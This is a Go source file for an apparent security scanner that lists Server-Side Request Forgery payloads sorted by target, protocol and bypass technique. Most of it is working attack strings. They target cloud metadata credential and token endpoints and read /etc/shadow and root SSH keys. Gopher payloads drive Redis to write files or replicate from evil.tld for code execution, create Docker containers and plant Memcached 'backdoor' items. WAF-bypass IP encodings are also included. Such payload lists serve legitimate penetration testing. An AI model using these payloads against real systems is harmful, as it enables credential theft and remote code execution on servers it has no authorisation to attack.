// Package ssrf provides Server-Side Request Forgery payloads.
// Payloads are categorized by:
//   - Target type (Internal, Cloud Metadata, Local Files)
//   - Protocol (HTTP, file, gopher, dict)
//   - Bypass technique (IP encoding, DNS rebinding, redirects)
package ssrf

// TargetType represents the SSRF target type.
type TargetType string

const (
	TargetInternal  TargetType = "internal"
	TargetCloud     TargetType = "cloud"
	TargetLocalFile TargetType = "file"
	TargetProtocol  TargetType = "protocol"
)

// Protocol represents the protocol used in SSRF.
type Protocol string

const (
	ProtocolHTTP   Protocol = "http"
	ProtocolHTTPS  Protocol = "https"
	ProtocolFile   Protocol = "file"
	ProtocolGopher Protocol = "gopher"
	ProtocolDict   Protocol = "dict"
	ProtocolFTP    Protocol = "ftp"
)

// Payload represents an SSRF payload.
type Payload struct {
	Value       string
	Target      TargetType
	Protocol    Protocol
	Description string
	WAFBypass   bool
	CloudType   string // aws, gcp, azure, digital_ocean, etc.
}

// GetPayloads returns payloads for a specific target type.
func GetPayloads(target TargetType) []Payload {
	switch target {
	case TargetInternal:
		return internalPayloads
	case TargetCloud:
		return cloudPayloads
	case TargetLocalFile:
		return filePayloads
	case TargetProtocol:
		return protocolPayloads
	default:
		return internalPayloads
	}
}

// GetCloudPayloads returns payloads for a specific cloud provider.
func GetCloudPayloads(cloudType string) []Payload {
	var result []Payload
	for _, p := range cloudPayloads {
		if p.CloudType == cloudType {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns SSRF payloads with bypass techniques.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all SSRF payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, internalPayloads...)
	all = append(all, cloudPayloads...)
	all = append(all, filePayloads...)
	all = append(all, protocolPayloads...)
	all = append(all, bypassPayloads...)
	return all
}

// Internal network payloads.
// Source: PayloadsAllTheThings, HackTricks
var internalPayloads = []Payload{
	// Localhost variations
	{Value: "http://127.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Standard localhost"},
	{Value: "http://127.0.0.1:80", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost port 80"},
	{Value: "http://127.0.0.1:443", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost port 443"},
	{Value: "http://127.0.0.1:22", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost SSH"},
	{Value: "http://127.0.0.1:3306", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost MySQL"},
	{Value: "http://127.0.0.1:5432", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost PostgreSQL"},
	{Value: "http://127.0.0.1:6379", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost Redis"},
	{Value: "http://127.0.0.1:11211", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost Memcached"},
	{Value: "http://127.0.0.1:27017", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost MongoDB"},
	{Value: "http://127.0.0.1:9200", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost Elasticsearch"},
	{Value: "http://127.0.0.1:8080", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost alt HTTP"},
	{Value: "http://127.0.0.1:8443", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost alt HTTPS"},

	{Value: "http://localhost", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost hostname"},
	{Value: "http://localhost:80", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Localhost hostname port 80"},

	// Common internal ranges
	{Value: "http://192.168.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 192.168.0.1"},
	{Value: "http://192.168.1.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 192.168.1.1"},
	{Value: "http://10.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 10.0.0.1"},
	{Value: "http://172.16.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Internal 172.16.0.1"},

	// IPv6 localhost
	{Value: "http://[::1]", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "IPv6 localhost"},
	{Value: "http://[0:0:0:0:0:0:0:1]", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "IPv6 full localhost"},
	{Value: "http://[::ffff:127.0.0.1]", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "IPv6 mapped IPv4"},

	// --- HackTricks / PayloadAllTheThings internal-service expansion ---

	// Spring Boot Actuator. Default-disabled in modern Spring releases
	// but routinely re-enabled with `management.endpoints.web.exposure.include=*`
	// in dev configs that leak to prod. /env + /heapdump are the
	// crown-jewel leaks (every config property; full JVM heap).
	{Value: "http://127.0.0.1:8080/actuator", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Actuator root"},
	{Value: "http://127.0.0.1:8080/actuator/env", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Actuator env (cred leak)"},
	{Value: "http://127.0.0.1:8080/actuator/heapdump", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Actuator heapdump"},
	{Value: "http://127.0.0.1:8080/actuator/configprops", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Actuator config props"},
	{Value: "http://127.0.0.1:8080/actuator/mappings", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Actuator mappings (route enum)"},
	{Value: "http://127.0.0.1:8080/actuator/gateway/routes", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Gateway routes (RCE pivot)"},
	{Value: "http://127.0.0.1:8080/actuator/jolokia/list", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Spring Actuator jolokia bridge"},
	{Value: "http://127.0.0.1:8080/jolokia/list", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Jolokia MBean list (JNDI RCE pivot)"},

	// Consul / Vault — service discovery and secrets backends often
	// reachable on localhost without authn for dev clusters.
	{Value: "http://127.0.0.1:8500/v1/kv/?recurse", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Consul KV recursive dump"},
	{Value: "http://127.0.0.1:8500/v1/catalog/services", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Consul service catalog"},
	{Value: "http://127.0.0.1:8500/v1/agent/self", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Consul agent identity"},
	{Value: "http://127.0.0.1:8200/v1/sys/health", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Vault sys/health"},
	{Value: "http://127.0.0.1:8200/v1/sys/init", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Vault init status (unseal-key leak surface)"},
	{Value: "http://127.0.0.1:8200/v1/auth/token/lookup-self", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Vault token lookup-self"},

	// Tomcat / WebLogic / JBoss application servers
	{Value: "http://127.0.0.1:8080/manager/html", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Tomcat manager (war deploy RCE)"},
	{Value: "http://127.0.0.1:8080/host-manager/html", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Tomcat host-manager"},
	{Value: "http://127.0.0.1:7001/console/login/LoginForm.jsp", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "WebLogic console (CVE-2020-2883 etc.)"},
	{Value: "http://127.0.0.1:8080/jmx-console/", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "JBoss JMX console"},

	// Jenkins
	{Value: "http://127.0.0.1:8080/asynchPeople/api/json", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Jenkins user enum (no auth)"},
	{Value: "http://127.0.0.1:8080/script", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Jenkins Groovy console (RCE)"},

	// Solr / Elasticsearch admin
	{Value: "http://127.0.0.1:8983/solr/admin/cores", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Solr admin (CVE-2019-0193)"},
	{Value: "http://127.0.0.1:9200/_cluster/health", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Elasticsearch cluster health"},
	{Value: "http://127.0.0.1:9200/_search", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Elasticsearch _search (data exfil)"},
}

// Cloud metadata payloads.
// Source: PayloadsAllTheThings, HackTricks
var cloudPayloads = []Payload{
	// AWS
	{Value: "http://169.254.169.254/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS metadata root", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/ami-id", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS AMI ID", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/hostname", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS hostname", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IAM credentials", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/user-data", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS user data", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/dynamic/instance-identity/document", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS instance identity", CloudType: "aws"},

	// GCP
	{Value: "http://169.254.169.254/computeMetadata/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP metadata root", CloudType: "gcp"},
	{Value: "http://169.254.169.254/computeMetadata/v1/instance/hostname", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP hostname", CloudType: "gcp"},
	{Value: "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP service token", CloudType: "gcp"},
	{Value: "http://169.254.169.254/computeMetadata/v1/project/project-id", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP project ID", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP metadata internal", CloudType: "gcp"},

	// Azure
	{Value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure instance metadata", CloudType: "azure"},
	{Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure OAuth token", CloudType: "azure"},

	// DigitalOcean
	{Value: "http://169.254.169.254/metadata/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "DigitalOcean metadata", CloudType: "digitalocean"},
	{Value: "http://169.254.169.254/metadata/v1/hostname", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "DigitalOcean hostname", CloudType: "digitalocean"},
	{Value: "http://169.254.169.254/metadata/v1/id", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "DigitalOcean ID", CloudType: "digitalocean"},

	// Oracle Cloud
	{Value: "http://169.254.169.254/opc/v1/instance/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Oracle Cloud instance", CloudType: "oracle"},
	{Value: "http://169.254.169.254/opc/v2/instance/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Oracle Cloud instance v2", CloudType: "oracle"},

	// Alibaba Cloud
	{Value: "http://100.100.100.200/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Alibaba Cloud metadata", CloudType: "alibaba"},
	{Value: "http://100.100.100.200/latest/meta-data/ram/security-credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Alibaba RAM credentials", CloudType: "alibaba"},

	// Tencent Cloud
	{Value: "http://metadata.tencentyun.com/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Tencent Cloud metadata", CloudType: "tencent"},
	{Value: "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Tencent CAM credentials", CloudType: "tencent"},

	// IBM Cloud (token endpoint requires PUT; URL still works as a leak signal)
	{Value: "http://169.254.169.254/instance_identity/v1/token", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "IBM Cloud identity token", CloudType: "ibm"},
	{Value: "http://api.metadata.cloud.ibm.com/instance_identity/v1/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "IBM Cloud metadata", CloudType: "ibm"},

	// AWS IMDSv2 token endpoint (PUT-required; included so detectors that
	// observe a 405/401 instead of plain 404 can still flag the host).
	{Value: "http://169.254.169.254/latest/api/token", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IMDSv2 token endpoint", CloudType: "aws"},

	// IPv6 metadata variants (used by some cloud platforms / mDNS).
	{Value: "http://[fd00:ec2::254]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IPv6 metadata", CloudType: "aws"},
	{Value: "http://[fe80::a9fe:a9fe]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Link-local IPv6 metadata", CloudType: "aws"},

	// Hex-encoded IP bypass (decimal variant already lives in the
	// WAF-bypass table further down so it isn't duplicated here).
	{Value: "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS metadata (hex IP)", CloudType: "aws"},

	// Kubernetes
	{Value: "https://kubernetes.default.svc/", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes API internal", CloudType: "kubernetes"},
	{Value: "https://kubernetes.default.svc/api/v1/namespaces", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes namespaces", CloudType: "kubernetes"},
	{Value: "https://kubernetes.default.svc.cluster.local/api/v1/secrets", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Kubernetes secrets", CloudType: "kubernetes"},

	// --- HackTricks Cloud knowledge expansion ---

	// AWS — ECS task metadata. ECS injects the metadata IP into the
	// container env var ECS_CONTAINER_METADATA_URI; SSRF probes can hit
	// it directly if the task role's network namespace is reachable.
	{Value: "http://169.254.170.2/v2/metadata", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS ECS task metadata v2", CloudType: "aws"},
	{Value: "http://169.254.170.2/v2/credentials/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS ECS task credentials root", CloudType: "aws"},
	{Value: "http://169.254.170.2/v3/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS ECS task metadata v3", CloudType: "aws"},
	{Value: "http://169.254.170.2/v4/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS ECS task metadata v4", CloudType: "aws"},
	{Value: "http://169.254.170.2/v4/task", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS ECS task v4 detail", CloudType: "aws"},

	// AWS — IMDSv1 paths beyond the basics already listed. Each leaks
	// either identity or signing material that grafts onto a stolen
	// role's STS session.
	{Value: "http://169.254.169.254/latest/meta-data/iam/info", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IAM role info", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS EC2 instance identity creds", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/dynamic/instance-identity/signature", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS instance identity signature", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/dynamic/instance-identity/rsa2048", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS instance identity RSA-2048", CloudType: "aws"},
	{Value: "http://169.254.169.254/latest/meta-data/network/interfaces/macs/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS network MACs (path traversal pivot)", CloudType: "aws"},

	// GCP — identity tokens (audience-bound, often forgeable into
	// other service accounts) and SSH key leak.
	{Value: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.com", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP service-account identity (OIDC token)", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP service-account email", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP service-account scopes", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP instance attribute ssh-keys", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP project-wide ssh-keys", CloudType: "gcp"},
	{Value: "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?recursive=true", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "GCP recursive token (Metadata-Flavor bypass via v1beta1)", CloudType: "gcp", WAFBypass: true},

	// Azure — scheduled events (leaks maintenance state) and the MSI
	// token endpoint with a non-default resource (often-overlooked SSRF
	// hop into Key Vault).
	{Value: "http://169.254.169.254/metadata/scheduledevents?api-version=2019-08-01", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure scheduled events", CloudType: "azure"},
	{Value: "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure network metadata", CloudType: "azure"},
	{Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure MSI token for Key Vault", CloudType: "azure"},
	{Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure MSI token for Storage", CloudType: "azure"},
	{Value: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Azure MSI token for MS Graph", CloudType: "azure"},

	// OpenStack — `/openstack/latest/` returns user_data + meta_data on
	// most distributions; identical IP to AWS so it's an easy collateral
	// leak when the same network mapping is reused.
	{Value: "http://169.254.169.254/openstack/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "OpenStack metadata root", CloudType: "openstack"},
	{Value: "http://169.254.169.254/openstack/latest/meta_data.json", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "OpenStack meta_data.json", CloudType: "openstack"},
	{Value: "http://169.254.169.254/openstack/latest/user_data", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "OpenStack user_data (cloud-init)", CloudType: "openstack"},

	// Equinix / Hetzner / Vultr — covered by HackTricks as "lesser
	// metadata services". Same 169.254.169.254 IP but different paths.
	{Value: "https://metadata.platformequinix.com/metadata", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "Equinix Metal metadata", CloudType: "equinix"},
	{Value: "http://169.254.169.254/hetzner/v1/metadata", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Hetzner Cloud metadata", CloudType: "hetzner"},
	{Value: "http://169.254.169.254/hetzner/v1/metadata/private-networks", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Hetzner private networks", CloudType: "hetzner"},
	{Value: "http://169.254.169.254/v1.json", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "Vultr metadata (one-shot JSON)", CloudType: "vultr"},

	// Kubernetes kubelet — read API ports (often left open without
	// authn on the node IP). Even one HTTP 200 on /pods is a critical
	// finding because it lists every pod's service account.
	{Value: "https://127.0.0.1:10250/pods", Target: TargetCloud, Protocol: ProtocolHTTPS, Description: "K8s kubelet authenticated /pods", CloudType: "kubernetes"},
	{Value: "http://127.0.0.1:10255/pods", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "K8s kubelet read-only /pods", CloudType: "kubernetes"},
	{Value: "http://127.0.0.1:10255/spec", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "K8s kubelet /spec", CloudType: "kubernetes"},
	{Value: "http://127.0.0.1:2379/v2/keys/?recursive=true", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "etcd v2 keys (unauthenticated)", CloudType: "kubernetes"},
	{Value: "http://127.0.0.1:2379/version", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "etcd version probe", CloudType: "kubernetes"},
}

// Local file access payloads.
// Source: PayloadsAllTheThings, HackTricks
var filePayloads = []Payload{
	// Linux files
	{Value: "file:///etc/passwd", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux passwd"},
	{Value: "file:///etc/shadow", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux shadow"},
	{Value: "file:///etc/hosts", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux hosts"},
	{Value: "file:///etc/hostname", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux hostname"},
	{Value: "file:///etc/issue", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Linux issue"},
	{Value: "file:///proc/self/environ", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Process environment"},
	{Value: "file:///proc/self/cmdline", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Process cmdline"},
	{Value: "file:///proc/self/fd/0", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Process stdin"},
	{Value: "file:///root/.ssh/id_rsa", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Root SSH key"},
	{Value: "file:///root/.bash_history", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Root bash history"},

	// Web application files
	{Value: "file:///var/www/html/index.php", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Web root index"},
	{Value: "file:///var/www/html/.htaccess", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Apache htaccess"},
	{Value: "file:///var/log/apache2/access.log", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Apache access log"},
	{Value: "file:///var/log/apache2/error.log", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Apache error log"},
	{Value: "file:///var/log/nginx/access.log", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Nginx access log"},

	// Windows files
	{Value: "file:///c:/windows/win.ini", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Windows win.ini"},
	{Value: "file:///c:/windows/system32/drivers/etc/hosts", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "Windows hosts"},
	{Value: "file:///c:/inetpub/wwwroot/web.config", Target: TargetLocalFile, Protocol: ProtocolFile, Description: "IIS web.config"},
}

// Alternative protocol payloads.
// Source: HackTricks, PayloadsAllTheThings
var protocolPayloads = []Payload{
	// Gopher protocol (for exploiting internal services)
	{Value: "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Redis INFO"},
	{Value: "gopher://127.0.0.1:11211/_stats", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Memcached stats"},
	{Value: "gopher://127.0.0.1:3306/_", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher MySQL probe"},

	// Dict protocol
	{Value: "dict://127.0.0.1:6379/INFO", Target: TargetProtocol, Protocol: ProtocolDict, Description: "Dict Redis INFO"},
	{Value: "dict://127.0.0.1:11211/stats", Target: TargetProtocol, Protocol: ProtocolDict, Description: "Dict Memcached stats"},

	// FTP protocol
	{Value: "ftp://127.0.0.1/", Target: TargetProtocol, Protocol: ProtocolFTP, Description: "FTP localhost"},
	{Value: "ftp://anonymous:anonymous@127.0.0.1/", Target: TargetProtocol, Protocol: ProtocolFTP, Description: "FTP anonymous"},

	// --- HackTricks gopher / TCP-as-HTTP expansion ---

	// Gopher to Redis — write attacker-controlled shell to disk via
	// CONFIG SET dir + SET key + SAVE. The canonical SSRF-to-RCE chain.
	{Value: "gopher://127.0.0.1:6379/_*3%0d%0a$7%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0aDIR%0d%0a$5%0d%0a/tmp/", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Redis CONFIG SET dir"},
	{Value: "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0aa%0d%0a$5%0d%0apayl0", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Redis SET key"},
	{Value: "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aSAVE%0d%0a", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Redis SAVE"},
	{Value: "gopher://127.0.0.1:6379/_*3%0d%0a$7%0d%0aSLAVEOF%0d%0a$7%0d%0aevil.tld%0d%0a$4%0d%0a6379", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Redis SLAVEOF (load module RCE)"},

	// Gopher to Docker socket — POST to /containers/create lets a
	// reachable SSRF spawn an arbitrary privileged container.
	{Value: "gopher://127.0.0.1:2375/_POST%20/containers/create%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0aContent-Type:application/json%0d%0aContent-Length:43%0d%0a%0d%0a%7B%22Image%22:%22alpine%22,%22Cmd%22:%5B%22sh%22%5D%7D", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Docker socket containers/create"},
	{Value: "http://127.0.0.1:2375/version", Target: TargetProtocol, Protocol: ProtocolHTTP, Description: "Docker API version probe (TCP exposure)"},
	{Value: "http://127.0.0.1:2375/containers/json", Target: TargetProtocol, Protocol: ProtocolHTTP, Description: "Docker containers list"},

	// Gopher to SMTP — open relay / mail spoofing
	{Value: "gopher://127.0.0.1:25/_HELO%20attacker%0d%0aMAIL%20FROM:%3Cattacker@evil.tld%3E", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher SMTP HELO/MAIL FROM"},

	// FastCGI via gopher — RCE on misconfigured PHP-FPM exposed on
	// localhost:9000 (PHP_VALUE injection chain).
	{Value: "gopher://127.0.0.1:9000/_%01%01", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher FastCGI handshake (PHP-FPM)"},

	// Memcached add — fixate a session, plant a backdoor item.
	{Value: "gopher://127.0.0.1:11211/_add%20backdoor%200%200%208%0d%0apayload1%0d%0a", Target: TargetProtocol, Protocol: ProtocolGopher, Description: "Gopher Memcached add"},
}

// Bypass payloads using various techniques.
// Source: PayloadsAllTheThings, HackTricks
var bypassPayloads = []Payload{
	// Decimal IP encoding
	{Value: "http://2130706433", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Decimal IP 127.0.0.1", WAFBypass: true},
	{Value: "http://017700000001", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Octal IP 127.0.0.1", WAFBypass: true},
	{Value: "http://0x7f000001", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Hex IP 127.0.0.1", WAFBypass: true},
	{Value: "http://0x7f.0x0.0x0.0x1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Hex dotted 127.0.0.1", WAFBypass: true},
	{Value: "http://0177.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Mixed octal 127.0.0.1", WAFBypass: true},

	// Shortened IP
	{Value: "http://127.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Shortened localhost", WAFBypass: true},
	{Value: "http://0", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Zero localhost", WAFBypass: true},
	{Value: "http://0.0.0.0", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Zero IP", WAFBypass: true},

	// URL encoding
	{Value: "http://127.0.0.1%00@evil.com", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Null byte injection", WAFBypass: true},
	{Value: "http://evil.com@127.0.0.1", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Auth bypass", WAFBypass: true},
	{Value: "http://127.0.0.1#@evil.com", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Fragment bypass", WAFBypass: true},
	{Value: "http://127.0.0.1?@evil.com", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Query bypass", WAFBypass: true},

	// DNS rebinding setup
	{Value: "http://localtest.me", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "localtest.me (127.0.0.1)", WAFBypass: true},
	{Value: "http://127.0.0.1.nip.io", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "nip.io wildcard", WAFBypass: true},
	{Value: "http://127.0.0.1.xip.io", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "xip.io wildcard", WAFBypass: true},
	{Value: "http://spoofed.burpcollaborator.net", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "DNS rebind collaborator", WAFBypass: true},

	// Cloud metadata bypass
	{Value: "http://169.254.169.254.nip.io/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS via nip.io", WAFBypass: true, CloudType: "aws"},
	{Value: "http://[::ffff:169.254.169.254]/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS IPv6 mapped", WAFBypass: true, CloudType: "aws"},
	{Value: "http://0251.0376.0251.0376/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS octal IP", WAFBypass: true, CloudType: "aws"},
	{Value: "http://2852039166/latest/meta-data/", Target: TargetCloud, Protocol: ProtocolHTTP, Description: "AWS decimal IP", WAFBypass: true, CloudType: "aws"},

	// Unicode/IDNA normalization
	{Value: "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ", Target: TargetInternal, Protocol: ProtocolHTTP, Description: "Unicode localhost", WAFBypass: true},
